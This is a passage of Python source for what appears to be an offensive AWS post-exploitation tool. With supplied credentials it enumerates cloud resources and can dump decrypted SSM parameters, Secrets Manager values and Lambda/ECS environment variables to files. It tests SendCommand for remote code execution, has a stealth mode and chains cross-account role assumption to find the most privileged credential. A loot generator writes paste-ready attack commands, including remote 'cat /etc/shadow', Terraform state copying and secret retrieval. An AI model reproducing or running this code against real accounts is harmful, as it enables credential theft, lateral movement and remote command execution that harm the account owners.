            import json as _json
            try:
                pol_doc = _json.loads(policy["Policy"])
                for stmt in pol_doc.get("Statement", []):
                    principal = stmt.get("Principal", "")
                    effect = stmt.get("Effect", "")
                    action = stmt.get("Action", [])
                    if isinstance(action, str):
                        action = [action]
                    if effect == "Allow" and principal in ("*", {"AWS": "*"}):
                        write_actions = [a for a in action if any(w in a.lower()
                                         for w in ["put", "delete", "s3:*"])]
                        if write_actions:
                            s3_result["policy_writable"].append({
                                "bucket": bname,
                                "actions": write_actions,
                            })
            except Exception:
                pass

        # Check versioning — unversioned buckets are easier to tamper
        ver, _ = safe(client.get_bucket_versioning, Bucket=bname)
        if ver and ver.get("Status") != "Enabled":
            s3_result["versioning_disabled"].append(bname)

    return s3_result


def check_ec2(key_id, secret, token, region, timeout):
    client = make_client("ec2", key_id, secret, token, region, timeout)
    result = {}

    instances, _ = safe(client.describe_instances)
    if instances:
        running = []
        for r in instances.get("Reservations", []):
            for i in r.get("Instances", []):
                if i.get("State", {}).get("Name") == "running":
                    running.append({
                        "id": i["InstanceId"],
                        "type": i.get("InstanceType"),
                        "private_ip": i.get("PrivateIpAddress"),
                        "public_ip": i.get("PublicIpAddress"),
                        "name": next((t["Value"] for t in i.get("Tags", [])
                                      if t["Key"] == "Name"), ""),
                        "iam_profile": i.get("IamInstanceProfile", {}).get("Arn", "")
                    })
        result["running_instances"] = running
        result["running_count"] = len(running)

    vpcs, _ = safe(client.describe_vpcs)
    if vpcs:
        result["vpcs"] = [
            {"id": v["VpcId"], "cidr": v["CidrBlock"], "default": v["IsDefault"],
             "name": next((t["Value"] for t in v.get("Tags", [])
                           if t["Key"] == "Name"), "")}
            for v in vpcs.get("Vpcs", [])
        ]

    return result


def check_eks(key_id, secret, token, timeout, regions):
    """Enumerate EKS clusters via list-clusters API across regions"""
    clusters = {}
    for region in regions:
        client = make_client("eks", key_id, secret, token, region, timeout)
        result, err = safe(client.list_clusters)
        if result and result.get("clusters"):
            cluster_list = result["clusters"]
            clusters[region] = cluster_list
            details = {}
            for name in cluster_list:
                desc, _ = safe(client.describe_cluster, name=name)
                if desc:
                    cl = desc["cluster"]
                    details[name] = {
                        "status": cl.get("status"),
                        "version": cl.get("version"),
                        "endpoint": cl.get("endpoint"),
                        "role_arn": cl.get("roleArn"),
                        "k8s_network": cl.get("kubernetesNetworkConfig", {}),
                    }
            clusters[f"{region}_details"] = details
    return clusters


def check_ecr(key_id, secret, token, region, timeout):
    client = make_client("ecr", key_id, secret, token, region, timeout)
    repos = []
    try:
        paginator = client.get_paginator("describe_repositories")
        for page in paginator.paginate():
            for r in page.get("repositories", []):
                repos.append({
                    "name": r["repositoryName"],
                    "uri": r["repositoryUri"],
                    "created": str(r.get("createdAt", "")),
                })
    except Exception:
        r, _ = safe(client.describe_repositories)
        if r:
            repos = [{"name": x["repositoryName"], "uri": x["repositoryUri"]}
                     for x in r.get("repositories", [])]
    return {"total": len(repos), "repos": repos}


def check_ssm(key_id, secret, token, region, timeout,
              pull_secrets=False, out_dir="/tmp", account_id="unknown", stealth=False):
    client = make_client("ssm", key_id, secret, token, region, timeout)
    result = {}

    # Managed instances
    instances, err = safe(client.describe_instance_information)
    if instances:
        inst_list = [
            {
                "id": i["InstanceId"],
                "ip": i.get("IPAddress", ""),
                "platform": f"{i.get('PlatformName','')} {i.get('PlatformVersion','')}".strip(),
                "ping": i.get("PingStatus", ""),
                "agent_version": i.get("AgentVersion", ""),
            }
            for i in instances.get("InstanceInformationList", [])
        ]
        result["managed_instances"] = inst_list
        result["managed_instances_count"] = len(inst_list)
    else:
        result["managed_instances_count"] = 0
        result["managed_instances_error"] = err

    # List all parameter names
    all_params = []
    try:
        paginator = client.get_paginator("describe_parameters")
        for page in paginator.paginate():
            all_params.extend(page.get("Parameters", []))
    except Exception:
        p, _ = safe(client.describe_parameters, MaxResults=50)
        if p:
            all_params = p.get("Parameters", [])

    param_names = [p["Name"] for p in all_params]
    param_types = {p["Name"]: p.get("Type", "") for p in all_params}
    result["parameter_count"] = len(param_names)
    result["parameter_names"] = param_names
    result["secure_string_count"] = sum(1 for t in param_types.values() if t == "SecureString")

    # Save names to file
    if param_names:
        names_file = os.path.join(out_dir, f"ssm_params_{account_id}_{region}.txt")
        with open(names_file, "w") as f:
            f.write(f"SSM Parameters — Account {account_id} / Region {region}\n")
            f.write(f"Total: {len(param_names)} | SecureString: {result['secure_string_count']}\n")
            f.write("=" * 60 + "\n\n")
            for name in sorted(param_names):
                ptype = param_types.get(name, "")
                f.write(f"[{ptype:14s}] {name}\n")
        result["params_file"] = names_file

    # Optionally pull values
    if pull_secrets and param_names:
        values_file = os.path.join(out_dir, f"ssm_secrets_{account_id}_{region}.txt")
        readable = {}
        for name in param_names:
            val, _ = safe(client.get_parameter, Name=name, WithDecryption=True)
            if val:
                readable[name] = {
                    "value": val["Parameter"]["Value"],
                    "type": val["Parameter"]["Type"],
                }
        with open(values_file, "w") as f:
            f.write(f"SSM Secrets — Account {account_id} / Region {region}\n")
            f.write(f"Readable: {len(readable)}/{len(param_names)}\n")
            f.write("=" * 60 + "\n\n")
            for name, data in sorted(readable.items()):
                f.write(f"[{data['type']:14s}] {name}\n  VALUE: {data['value']}\n\n")
        result["secrets_file"] = values_file
        result["readable_count"] = len(readable)

    # Test GetParameter access
    if param_names:
        val, err = safe(client.get_parameter, Name=param_names[0], WithDecryption=True)
        result["get_parameter_access"] = "ALLOWED" if val else f"DENIED — {err}"
    else:
        result["get_parameter_access"] = "NOT TESTED"

    # Test SendCommand (IAM check via fake instance) — skip in stealth mode
    if stealth:
        result["send_command_access"] = "SKIPPED (stealth mode)"
    elif result.get("managed_instances_count", 0) > 0:
        _, err = safe(
            client.send_command,
            InstanceIds=["i-00000000000000000"],
            DocumentName="AWS-RunShellScript",
            Parameters={"commands": ["id"]}
        )
        if err is None:
            result["send_command_access"] = "ALLOWED — RCE POSSIBLE"
        elif "InvalidInstanceId" in str(err):
            result["send_command_access"] = "ALLOWED — RCE POSSIBLE (IAM permits)"
        elif "AccessDenied" in str(err) or "UnauthorizedOperation" in str(err):
            result["send_command_access"] = "DENIED"
        else:
            result["send_command_access"] = f"UNKNOWN — {err}"
    else:
        result["send_command_access"] = "NOT TESTED — no managed instances"

    return result


def check_secrets_manager(key_id, secret, token, region, timeout,
                           pull_secrets=False, out_dir="/tmp", account_id="unknown"):
    client = make_client("secretsmanager", key_id, secret, token, region, timeout)
    all_secrets = []
    try:
        paginator = client.get_paginator("list_secrets")
        for page in paginator.paginate():
            all_secrets.extend(page.get("SecretList", []))
    except Exception:
        r, err = safe(client.list_secrets, MaxResults=100)
        if r:
            all_secrets = r.get("SecretList", [])
        else:
            return {"error": err}

    secret_names = [s["Name"] for s in all_secrets]
    result = {"total": len(secret_names), "secret_names": secret_names}

    if secret_names:
        names_file = os.path.join(out_dir, f"sm_names_{account_id}_{region}.txt")
        with open(names_file, "w") as f:
            f.write(f"Secrets Manager — Account {account_id} / Region {region}\n")
            f.write(f"Total: {len(secret_names)}\n")
            f.write("=" * 60 + "\n\n")
            for s in all_secrets:
                f.write(f"{s['Name']}\n")
                if s.get("Description"):
                    f.write(f"  Description  : {s['Description']}\n")
                f.write(f"  Last changed : {s.get('LastChangedDate','N/A')}\n\n")
        result["names_file"] = names_file

    if pull_secrets and secret_names:
        values_file = os.path.join(out_dir, f"sm_secrets_{account_id}_{region}.txt")
        readable = {}
        for name in secret_names:
            val, _ = safe(client.get_secret_value, SecretId=name)
            if val:
                readable[name] = val.get("SecretString") or str(val.get("SecretBinary", ""))
        with open(values_file, "w") as f:
            f.write(f"Secrets Manager Values — Account {account_id} / Region {region}\n")
            f.write(f"Readable: {len(readable)}/{len(secret_names)}\n")
            f.write("=" * 60 + "\n\n")
            for name, value in sorted(readable.items()):
                f.write(f"{name}\n  VALUE: {value}\n\n")
        result["values_file"] = values_file
        result["readable_count"] = len(readable)
        print(f"    {ts()}   SM values ({len(readable)} readable) → {values_file}", flush=True)

    return result


def check_org(key_id, secret, token, region, timeout, partition="aws"):
    # Organizations API must target us-east-1 (or cn-northwest-1 for China)
    client = make_client("organizations", key_id, secret, token, org_region(partition), timeout)
    org, err = safe(client.describe_organization)
    if err:
        return {"error": err}
    o = org["Organization"]
    result = {
        "org_id": o.get("Id"),
        "master_account": o.get("MasterAccountId"),
        "master_email": o.get("MasterAccountEmail"),
        "feature_set": o.get("FeatureSet"),
    }
    # List all accounts using safe() per page
    all_accounts = []
    next_token = None
    while True:
        kwargs = {"MaxResults": 20}
        if next_token:
            kwargs["NextToken"] = next_token
        page, err = safe(client.list_accounts, **kwargs)
        if err:
            result["accounts_error"] = err
            break
        all_accounts.extend(page.get("Accounts", []))
        next_token = page.get("NextToken")
        if not next_token:
            break
    if all_accounts:
        result["accounts"] = [
            {"id": a["Id"], "name": a["Name"],
             "email": a["Email"], "status": a["Status"]}
            for a in all_accounts
        ]
        result["account_count"] = len(all_accounts)
    return result


def check_rds(key_id, secret, token, region, timeout):
    client = make_client("rds", key_id, secret, token, region, timeout)
    result = {}
    instances, _ = safe(client.describe_db_instances)
    if instances:
        result["instances"] = [
            {
                "id": i["DBInstanceIdentifier"],
                "engine": f"{i['Engine']} {i.get('EngineVersion','')}",
                "status": i["DBInstanceStatus"],
                "endpoint": i.get("Endpoint", {}).get("Address", ""),
                "port": i.get("Endpoint", {}).get("Port", ""),
                "publicly_accessible": i.get("PubliclyAccessible", False),
            }
            for i in instances.get("DBInstances", [])
        ]
    clusters, _ = safe(client.describe_db_clusters)
    if clusters:
        result["clusters"] = [
            {
                "id": c["DBClusterIdentifier"],
                "engine": f"{c['Engine']} {c.get('EngineVersion','')}",
                "status": c["Status"],
                "endpoint": c.get("Endpoint", ""),
            }
            for c in clusters.get("DBClusters", [])
        ]
    return result


def check_lambda(key_id, secret, token, region, timeout):
    client = make_client("lambda", key_id, secret, token, region, timeout)
    functions = []
    try:
        paginator = client.get_paginator("list_functions")
        for page in paginator.paginate():
            for fn in page.get("Functions", []):
                functions.append({
                    "name": fn["FunctionName"],
                    "runtime": fn.get("Runtime", ""),
                    "role": fn.get("Role", ""),
                })
    except Exception:
        r, _ = safe(client.list_functions)
        if r:
            functions = [{"name": f["FunctionName"]} for f in r.get("Functions", [])]
    return {"total": len(functions), "functions": functions}


def check_logs(key_id, secret, token, region, timeout):
    client = make_client("logs", key_id, secret, token, region, timeout)
    result, err = safe(client.describe_log_groups, limit=50)
    if err:
        return {"error": err}
    return {"total": len(result.get("logGroups", [])),
            "log_groups": [g["logGroupName"] for g in result.get("logGroups", [])]}


# ─── New Checks: Env Vars, Role Trusts, Loot ─────────────────────────────────

def check_env_vars(key_id, secret, token, region, timeout):
    """Extract environment variables from Lambda, ECS task defs — credential goldmine."""
    result = {"lambda": [], "ecs": []}

    # Lambda env vars
    lam = make_client("lambda", key_id, secret, token, region, timeout)
    try:
        paginator = lam.get_paginator("list_functions")
        for page in paginator.paginate():
            for fn in page.get("Functions", []):
                env = fn.get("Environment", {}).get("Variables", {})
                if env:
                    # Flag interesting vars
                    interesting = {k: v for k, v in env.items()
                                   if any(kw in k.upper() for kw in
                                          ["KEY", "SECRET", "PASSWORD", "TOKEN", "API",
                                           "CREDENTIAL", "AUTH", "DB", "DATABASE", "CONN",
                                           "PRIVATE", "ACCESS"])}
                    result["lambda"].append({
                        "function": fn["FunctionName"],
                        "role": fn.get("Role", ""),
                        "runtime": fn.get("Runtime", ""),
                        "env_count": len(env),
                        "interesting": interesting,
                        "all_vars": env,
                    })
    except Exception:
        r, _ = safe(lam.list_functions)
        if r:
            for fn in r.get("Functions", []):
                env = fn.get("Environment", {}).get("Variables", {})
                if env:
                    result["lambda"].append({
                        "function": fn["FunctionName"],
                        "env_count": len(env),
                        "all_vars": env,
                    })

    # ECS task definition env vars
    ecs = make_client("ecs", key_id, secret, token, region, timeout)
    task_defs, _ = safe(ecs.list_task_definitions, status="ACTIVE")
    if task_defs:
        for arn in task_defs.get("taskDefinitionArns", [])[:20]:
            td, _ = safe(ecs.describe_task_definition, taskDefinition=arn)
            if td:
                for container in td.get("taskDefinition", {}).get("containerDefinitions", []):
                    env = container.get("environment", [])
                    secrets_refs = container.get("secrets", [])
                    if env or secrets_refs:
                        env_dict = {e["name"]: e["value"] for e in env}
                        interesting = {k: v for k, v in env_dict.items()
                                       if any(kw in k.upper() for kw in
                                              ["KEY", "SECRET", "PASSWORD", "TOKEN", "API",
                                               "CREDENTIAL", "AUTH", "DB", "CONN", "PRIVATE"])}
                        result["ecs"].append({
                            "task_def": arn.split("/")[-1],
                            "container": container.get("name"),
                            "role": td.get("taskDefinition", {}).get("taskRoleArn", ""),
                            "env_count": len(env),
                            "secret_refs": len(secrets_refs),
                            "interesting": interesting,
                            "all_vars": env_dict,
                        })

    return result


def check_role_trusts(key_id, secret, token, region, timeout):
    """Analyze IAM role trust policies for overpermissive or external trusts."""
    client = make_client("iam", key_id, secret, token, region, timeout)
    result = {"external_trusts": [], "wildcard_trusts": [], "service_trusts": [], "total_roles": 0}

    roles, err = safe(client.list_roles, MaxItems=200)
    if not roles:
        return {"error": err}

    all_roles = roles.get("Roles", [])
    result["total_roles"] = len(all_roles)
    own_account = None

    for role in all_roles:
        trust_doc = role.get("AssumeRolePolicyDocument", {})
        role_name = role["RoleName"]
        role_arn = role["Arn"]

        # Extract account ID from role ARN
        if own_account is None and "::" in role_arn:
            own_account = role_arn.split(":")[4]

        for stmt in trust_doc.get("Statement", []):
            if stmt.get("Effect") != "Allow":
                continue
            principal = stmt.get("Principal", {})

            # Wildcard trust — anyone can assume
            if principal == "*" or principal == {"AWS": "*"}:
                result["wildcard_trusts"].append({
                    "role": role_name,
                    "arn": role_arn,
                    "condition": stmt.get("Condition", {}),
                })
                continue

            # Check AWS principals
            aws_principals = principal.get("AWS", [])
            if isinstance(aws_principals, str):
                aws_principals = [aws_principals]
            for p in aws_principals:
                if own_account and own_account not in p and p != "*":
                    result["external_trusts"].append({
                        "role": role_name,
                        "arn": role_arn,
                        "external_principal": p,
                        "condition": stmt.get("Condition", {}),
                    })

            # Service trusts
            svc_principals = principal.get("Service", [])
            if isinstance(svc_principals, str):
                svc_principals = [svc_principals]
            for svc in svc_principals:
                result["service_trusts"].append({
                    "role": role_name,
                    "service": svc,
                })

    return result


def generate_loot(result, out_dir, account_id):
    """Generate ready-to-execute commands for all enumerated resources."""
    loot_lines = []
    loot_lines.append(f"# AWS Loot — Account {account_id}")
    loot_lines.append(f"# Generated: {datetime.now(timezone.utc).strftime('%Y-%m-%d %H:%M:%S UTC')}")
    loot_lines.append(f"# Paste these commands to exploit enumerated resources\n")

    # S3 buckets
    s3 = result.get("s3", {})
    if s3.get("all"):
        loot_lines.append("# ── S3 Buckets ─────────────────────────────────────────")
        for b in s3["all"]:
            loot_lines.append(f"aws s3 ls s3://{b}/ --max-items 20")
        loot_lines.append("")
        if s3.get("terraform_buckets"):
            loot_lines.append("# Terraform state (may contain secrets):")
            for b in s3["terraform_buckets"]:
                loot_lines.append(f"aws s3 cp s3://{b}/ ./{b}/ --recursive --include '*.tfstate'")
            loot_lines.append("")

    # EC2 instances — SSM sessions
    for region, ssm_data in result.get("ssm", {}).items():
        if isinstance(ssm_data, dict) and ssm_data.get("managed_instances"):
            loot_lines.append(f"# ── SSM Sessions ({region}) ──────────────────────────────")
            for inst in ssm_data["managed_instances"]:
                loot_lines.append(f"aws ssm start-session --target {inst['id']} --region {region}  # {inst.get('platform','')} {inst.get('ip','')}")
            sc = ssm_data.get("send_command_access", "")
            if "ALLOWED" in str(sc):
                loot_lines.append(f"\n# RCE via SendCommand ({region}):")
                for inst in ssm_data["managed_instances"]:
                    loot_lines.append(f"aws ssm send-command --instance-ids {inst['id']} --document-name AWS-RunShellScript --parameters commands='id && whoami && cat /etc/shadow' --region {region}")
            loot_lines.append("")

    # EKS clusters
    eks = result.get("eks", {})
    cluster_regions = {k: v for k, v in eks.items() if not k.endswith("_details")}
    if cluster_regions:
        loot_lines.append("# ── EKS Clusters ───────────────────────────────────────")
        for region, clusters in cluster_regions.items():
            for c in clusters:
                loot_lines.append(f"aws eks update-kubeconfig --name {c} --region {region}")
                loot_lines.append(f"kubectl get pods --all-namespaces  # after kubeconfig update")
        loot_lines.append("")

    # ECR repos
    for region, ecr_data in result.get("ecr", {}).items():
        if isinstance(ecr_data, dict) and ecr_data.get("repos"):
            loot_lines.append(f"# ── ECR Repos ({region}) ────────────────────────────────")
            loot_lines.append(f"aws ecr get-login-password --region {region} | docker login --username AWS --password-stdin {account_id}.dkr.ecr.{region}.amazonaws.com")
            for repo in ecr_data["repos"][:10]:
                loot_lines.append(f"docker pull {repo.get('uri','')}:latest")
            loot_lines.append("")

    # RDS instances
    for region, rds_data in result.get("rds", {}).items():
        if isinstance(rds_data, dict) and rds_data.get("instances"):
            loot_lines.append(f"# ── RDS Databases ({region}) ────────────────────────────")
            for db in rds_data["instances"]:
                endpoint = db.get("endpoint", "")
                port = db.get("port", "")
                engine = db.get("engine", "")
                if "mysql" in engine.lower():
                    loot_lines.append(f"mysql -h {endpoint} -P {port} -u admin -p  # {db['id']}")
                elif "postgres" in engine.lower():
                    loot_lines.append(f"psql -h {endpoint} -p {port} -U postgres  # {db['id']}")
                else:
                    loot_lines.append(f"# {db['id']}: {engine} @ {endpoint}:{port}")
            loot_lines.append("")

    # Lambda functions — download code
    for region, lam_data in result.get("lambda", {}).items():
        if isinstance(lam_data, dict) and lam_data.get("functions"):
            loot_lines.append(f"# ── Lambda Functions ({region}) ─────────────────────────")
            for fn in lam_data["functions"][:10]:
                loot_lines.append(f"aws lambda get-function --function-name {fn['name']} --region {region} --query 'Code.Location' --output text | xargs curl -o {fn['name']}.zip")
            loot_lines.append("")

    # Secrets Manager
    for region, sm_data in result.get("secrets_manager", {}).items():
        if isinstance(sm_data, dict) and sm_data.get("secret_names"):
            loot_lines.append(f"# ── Secrets Manager ({region}) ─────────────────────────")
            for name in sm_data["secret_names"][:20]:
                loot_lines.append(f"aws secretsmanager get-secret-value --secret-id '{name}' --region {region}")
            loot_lines.append("")

    # SSM Parameters
    for region, ssm_data in result.get("ssm", {}).items():
        if isinstance(ssm_data, dict) and ssm_data.get("parameter_names"):
            secure = [n for n in ssm_data["parameter_names"]
                      if ssm_data.get("secure_string_count", 0) > 0]
            if ssm_data["parameter_names"]:
                loot_lines.append(f"# ── SSM Parameters ({region}) ──────────────────────────")
                for name in ssm_data["parameter_names"][:20]:
                    loot_lines.append(f"aws ssm get-parameter --name '{name}' --with-decryption --region {region}")
                loot_lines.append("")

    # Env vars with interesting findings
    env_vars = result.get("env_vars", {})
    for region, ev_data in env_vars.items() if isinstance(env_vars, dict) else []:
        if isinstance(ev_data, dict):
            for fn_data in ev_data.get("lambda", []):
                if fn_data.get("interesting"):
                    loot_lines.append(f"# ── Lambda Env Vars: {fn_data['function']} ({region}) ──")
                    for k, v in fn_data["interesting"].items():
                        loot_lines.append(f"#   {k}={v}")
                    loot_lines.append("")

    # Role assumption commands
    role_trusts = result.get("role_trusts", {})
    if role_trusts.get("wildcard_trusts"):
        loot_lines.append("# ── Wildcard Trust Roles (anyone can assume) ─────────")
        for rt in role_trusts["wildcard_trusts"]:
            loot_lines.append(f"aws sts assume-role --role-arn {rt['arn']} --role-session-name pwn")
        loot_lines.append("")
    if role_trusts.get("external_trusts"):
        loot_lines.append("# ── External Trust Roles (cross-account) ─────────────")
        for rt in role_trusts["external_trusts"][:10]:
            loot_lines.append(f"# {rt['role']} trusts {rt['external_principal']}")
            loot_lines.append(f"aws sts assume-role --role-arn {rt['arn']} --role-session-name pwn")
        loot_lines.append("")

    # Write loot file
    loot_path = os.path.join(out_dir, f"loot_{account_id}.sh")
    with open(loot_path, "w") as f:
        f.write("\n".join(loot_lines) + "\n")

    return loot_path


def try_assume_role(key_id, secret, token, region, timeout, role_name, account_id, partition="aws"):
    """Try to assume a single role, return credentials tuple or None"""
    sts = make_client("sts", key_id, secret, token, region, timeout)
    role_arn = f"arn:{partition}:iam::{account_id}:role/{role_name}"
    assumed, err = safe(sts.assume_role, RoleArn=role_arn,
                        RoleSessionName="aws", DurationSeconds=3600)
    if assumed:
        c = assumed["Credentials"]
        return c["AccessKeyId"], c["SecretAccessKey"], c["SessionToken"], role_arn
    return None


def count_allowed(privs):
    """Return count of allowed actions from simulate result"""
    if not privs or "allowed" not in privs:
        return 0
    return len(privs["allowed"])


def session_arn_to_role_arn(arn):
    """
    Convert assumed-role session ARN to role ARN for simulate_principal_policy.
    arn:aws(-cn):sts::ACCT:assumed-role/ROLE/SESSION → arn:aws(-cn):iam::ACCT:role/ROLE
    """
    import re
    m = re.match(r"arn:(aws[\w-]*):sts::(\d+):assumed-role/([^/]+)/", arn)
    if m:
        return f"arn:{m.group(1)}:iam::{m.group(2)}:role/{m.group(3)}"
    return arn


def pick_best_credential(base_key, base_secret, base_token,
                          region, timeout, role_name,
                          extra_accounts, source_account, fast, partition="aws"):
    """
    Try to assume role_name in own account + extra_accounts.
    Run privilege simulation on base cred and each successful assumption.
    Return (key_id, secret, token, label, assumed_arn) for the most privileged.
    """
    candidates = []

    # Base credential
    base_identity, _ = check_identity(base_key, base_secret, base_token, region, timeout)
    base_label = f"base ({base_key[:16]}...)"
    base_allowed = 0

    if not fast and base_identity:
        base_privs = check_privs(base_key, base_secret, base_token, region, timeout, base_identity)
        base_allowed = count_allowed(base_privs)

    candidates.append({
        "key_id": base_key,
        "secret": base_secret,
        "token": base_token,
        "label": base_label,
        "arn": base_identity["arn"] if base_identity else "unknown",
        "allowed": base_allowed,
        "is_base": True,
    })

    # Try role in own account + extras
    all_accounts = dict(extra_accounts)
    if source_account not in all_accounts:
        all_accounts[source_account] = f"account-{source_account}"

    for acct_id, alias in all_accounts.items():
        print(f"  {ts()}   Trying {role_name} @ {alias} ({acct_id})...", flush=True)
        creds = try_assume_role(base_key, base_secret, base_token,
                                region, timeout, role_name, acct_id, partition)
        if not creds:
            print(f"  {ts()}     ✗ Denied", flush=True)
            continue
        print(f"  {ts()}     ✓ Assumed", flush=True)
        ak, sk, st, role_arn = creds
        assumed_identity, _ = check_identity(ak, sk, st, region, timeout)
        assumed_allowed = 0
        if not fast and assumed_identity:
            # Use role ARN not session ARN for simulate_principal_policy
            sim_identity = dict(assumed_identity)
            sim_identity["arn"] = session_arn_to_role_arn(assumed_identity["arn"])
            assumed_privs = check_privs(ak, sk, st, region, timeout, sim_identity)
            assumed_allowed = count_allowed(assumed_privs)
            if assumed_allowed == 0 and "error" in assumed_privs:
                print(f"    {ts()}   ⚠ Priv sim failed for assumed role: {assumed_privs['error']}", flush=True)
                # Fall back to counting accessible services directly
                s3_test, _ = safe(make_client("s3", ak, sk, st, region, timeout).list_buckets)
                eks_test, _ = safe(make_client("eks", ak, sk, st, "us-west-2", timeout).list_clusters)
                ssm_test, _ = safe(make_client("ssm", ak, sk, st, region, timeout).describe_parameters)
                assumed_allowed = sum([
                    50 if s3_test else 0,
                    20 if eks_test else 0,
                    10 if ssm_test else 0,
                ])
                print(f"    {ts()}   ↳ Estimated allowed (service probes): {assumed_allowed}", flush=True)

        candidates.append({
            "key_id": ak,
            "secret": sk,
            "token": st,
            "label": f"{role_name} @ {alias} ({acct_id})",
            "arn": assumed_identity["arn"] if assumed_identity else role_arn,
            "allowed": assumed_allowed,
            "is_base": False,
            "account_id": acct_id,
            "account_alias": alias,
        })

    # Pick the one with most allowed actions
    best = max(candidates, key=lambda x: x["allowed"])

    print(f"{ts()}   Privilege comparison:", flush=True)
    for c in candidates:
        marker = "★" if c == best else " "
        alias_str = f" [{c.get('account_alias','')}]" if c.get('account_alias') else ""
        print(f"{ts()}   {marker} {c['label']:50s}{alias_str} — {c['allowed']} allowed actions", flush=True)

    if best["is_base"]:
        print(f"{ts()}   → Using base credential (highest privilege)", flush=True)
    else:
        print(f"{ts()}   → Using assumed role: {best['label']} (higher privilege)", flush=True)

    return (best["key_id"], best["secret"], best["token"],
            best["label"], best["arn"], candidates)


# ─── Role assumption with full sub-enumeration ────────────────────────────────

def attempt_role_assumption(key_id, secret, token, region, timeout,
                             role_name, accounts, source_account,
                             pull_secrets, out_dir, regions=None, partition="aws"):
    sts = make_client("sts", key_id, secret, token, region, timeout)
    results = {}
    regions = regions or regions_for_partition(partition)

    all_accounts = dict(accounts)
    if source_account and source_account not in all_accounts:
        all_accounts[source_account] = f"account-{source_account}"

    print(f"    {ts()} Testing {role_name} in {len(all_accounts)} account(s) across {len(regions)} regions...", flush=True)

    for account_id, alias in all_accounts.items():
        role_arn = f"arn:{partition}:iam::{account_id}:role/{role_name}"
        cross = "(cross)" if account_id != source_account else "(own)"
        print(f"    {ts()}   {alias} ({account_id}) {cross}...", flush=True)

        assumed, err = safe(
            sts.assume_role,
            RoleArn=role_arn,
            RoleSessionName="aws",
            DurationSeconds=3600
        )

        if assumed:
            c = assumed["Credentials"]
            ak, sk, st = c["AccessKeyId"], c["SecretAccessKey"], c["SessionToken"]

            assumed_identity, _ = check_identity(ak, sk, st, region, timeout)

            entry = {
                "status": "SUCCESS",
                "account_alias": alias,
                "cross_account": account_id != source_account,
                "role_arn": role_arn,
                "assumed_arn": assumed_identity["arn"] if assumed_identity else "unknown",
                "access_key_id": ak,
                "expiration": str(c["Expiration"]),
                "eks_clusters": {},
                "s3": {},
                "ec2": {},
                "ecr": {},
                "ssm": {},
                "secrets_manager": {},
                "rds": {},
                "lambda": {},
                "logs": {},
            }

            # S3 (global)
            print(f"    {ts()}     S3...", flush=True)
            s3_r = check_s3(ak, sk, st, region, timeout)
            entry["s3"] = s3_r
            if "error" not in s3_r:
                print(f"    {ts()}       {s3_r['total']} buckets "
                      f"({len(s3_r.get('terraform_buckets',[]))} terraform)", flush=True)

            # All regional services
            for r in regions:
                print(f"    {ts()}     Region {r}...", flush=True)

                # EKS
                eks_c = make_client("eks", ak, sk, st, r, timeout)
                eks_r, _ = safe(eks_c.list_clusters)
                if eks_r and eks_r.get("clusters"):
                    entry["eks_clusters"][r] = eks_r["clusters"]
                    print(f"    {ts()}       EKS: {eks_r['clusters']}", flush=True)

                # EC2
                ec2 = check_ec2(ak, sk, st, r, timeout)
                inst = ec2.get("running_count", 0)
                vpcs = len(ec2.get("vpcs", []))
                if inst > 0 or vpcs > 0:
                    entry["ec2"][r] = ec2
                    print(f"    {ts()}       EC2: {inst} instances, {vpcs} VPCs", flush=True)

                # ECR
                ecr = check_ecr(ak, sk, st, r, timeout)
                if ecr["total"] > 0:
                    entry["ecr"][r] = ecr
                    print(f"    {ts()}       ECR: {ecr['total']} repos", flush=True)

                # SSM
                ssm_r = check_ssm(ak, sk, st, r, timeout,
                                   pull_secrets=pull_secrets,
                                   out_dir=out_dir,
                                   account_id=account_id)
                if ssm_r.get("managed_instances_count", 0) > 0 or ssm_r.get("parameter_count", 0) > 0:
                    entry["ssm"][r] = ssm_r
                    print(f"    {ts()}       SSM: {ssm_r.get('managed_instances_count',0)} instances, "
                          f"{ssm_r.get('parameter_count',0)} params", flush=True)

                # Secrets Manager
                sm_r = check_secrets_manager(ak, sk, st, r, timeout,
                                              pull_secrets=pull_secrets,
                                              out_dir=out_dir,
                                              account_id=account_id)
                if "error" not in sm_r and sm_r.get("total", 0) > 0:
                    entry["secrets_manager"][r] = sm_r
                    print(f"    {ts()}       SM: {sm_r['total']} secrets", flush=True)

                # RDS
                rds = check_rds(ak, sk, st, r, timeout)
                if rds.get("instances") or rds.get("clusters"):
                    entry["rds"][r] = rds
                    print(f"    {ts()}       RDS: {len(rds.get('instances',[]))} instances, "
                          f"{len(rds.get('clusters',[]))} clusters", flush=True)

                # Lambda
                lam = check_lambda(ak, sk, st, r, timeout)
                if lam["total"] > 0:
                    entry["lambda"][r] = lam
                    print(f"    {ts()}       Lambda: {lam['total']} functions", flush=True)

                # CloudWatch Logs
                logs = check_logs(ak, sk, st, r, timeout)
                if "error" not in logs and logs.get("total", 0) > 0:
                    entry["logs"][r] = logs
                    print(f"    {ts()}       Logs: {logs['total']} groups", flush=True)

            # Get alias for the assumed account
            assumed_alias_data, _ = safe(
                make_client("iam", ak, sk, st, region, timeout).list_account_aliases
            )
            assumed_alias = (assumed_alias_data.get("AccountAliases") or [None])[0] if assumed_alias_data else None
            if assumed_alias:
                entry["account_alias_confirmed"] = assumed_alias

            # Print totals
            eks_t = sum(len(c) for c in entry["eks_clusters"].values())
            ec2_t = sum(v.get("running_count", 0) for v in entry["ec2"].values())
            ecr_t = sum(v.get("total", 0) for v in entry["ecr"].values())
            ssm_p = sum(v.get("parameter_count", 0) for v in entry["ssm"].values())
            ssm_i = sum(v.get("managed_instances_count", 0) for v in entry["ssm"].values())
            sm_t = sum(v.get("total", 0) for v in entry["secrets_manager"].values())
            rds_t = sum(len(v.get("instances", [])) for v in entry["rds"].values())
            lam_t = sum(v.get("total", 0) for v in entry["lambda"].values())

            results[account_id] = entry
            alias_display = assumed_alias or alias
            print(f"    {ts()}   ✓ SUCCESS — {alias_display} ({account_id})", flush=True)
            print(f"    {ts()}     Totals: EKS={eks_t} EC2={ec2_t} ECR={ecr_t} "
                  f"SSM={ssm_p}p/{ssm_i}i SM={sm_t} RDS={rds_t} Lambda={lam_t}", flush=True)

        else:
            results[account_id] = {
                "status": "DENIED",
                "account_alias": alias,
                "cross_account": account_id != source_account,
                "role_arn": role_arn,
                "error": err
            }
            print(f"    {ts()}   ✗ {err}", flush=True)

    return results


# ─── Main enumeration ─────────────────────────────────────────────────────────

def enumerate_credential(key_id, secret, token, args, extra_accounts):
    region = args.region
    timeout = args.timeout
    regions = ALL_REGIONS if args.all_regions else DEFAULT_REGIONS
    pull = args.pull_secrets
    out_dir = args.out_dir

    result = {
        "key_id": key_id,
